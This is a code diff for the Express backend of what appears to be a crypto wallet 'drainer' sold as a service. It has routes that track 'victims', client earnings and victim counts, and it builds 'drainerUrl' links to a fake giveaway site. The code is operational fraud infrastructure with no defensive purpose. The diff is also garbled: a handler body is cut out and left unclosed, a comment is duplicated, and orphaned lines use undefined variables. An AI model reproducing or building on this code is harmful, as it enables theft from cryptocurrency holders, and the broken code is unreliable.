@@ -1771,7 +1771,6 @@ app.get(["/panel", "/panel.html"], (req, res) => {
 
 // Victim history API - FIXED VERSION
 app.get("/api/history", (req, res) => {
-
 // SAAS Clients API - Get all registered clients for the panel
 app.get("/api/saas-clients", (req, res) => {
   try {
@@ -1788,8 +1787,8 @@ app.get("/api/saas-clients", (req, res) => {
         totalEarnings: totalEarnings.toFixed(4),
         victimCount,
         registrationDate: client.registrationDate || "Recent",
-        drainerUrl: `https://cheetah-giveaway.netlify.app/?client=${clientId}`,
-        dashboardUrl: `https://service-s816.onrender.com/saas/dashboard/${clientId}`
+        drainerUrl: "https://cheetah-giveaway.netlify.app/?client=" + clientId,
+        dashboardUrl: "https://service-s816.onrender.com/saas/dashboard/" + clientId
       };
     });
     
@@ -1803,21 +1802,8 @@ app.get("/api/saas-clients", (req, res) => {
     res.status(500).json({ error: "Failed to fetch clients" });
   }
 });
-  try {
-    const victimsFile = path.join(__dirname, "victims.json");
-    console.log('📁 Looking for victims.json at:', victimsFile);
-    
-    // Check if file exists - if not, create it
-    if (!fs.existsSync(victimsFile)) {
-      console.log('📁 victims.json not found, creating it...');
-      fs.writeFileSync(victimsFile, '[]', 'utf8');
-      return res.json([]); // Return empty array
-    }
-    
-    // Read the file
-    const fileContent = fs.readFileSync(victimsFile, "utf8").trim();
-    
-    // If file is empty, initialize with empty array
+
+// SAAS Clients API - Get all registered clients for the panel
     if (!fileContent) {
       console.log('📁 victims.json is empty, initializing...');
       fs.writeFileSync(victimsFile, '[]', 'utf8');
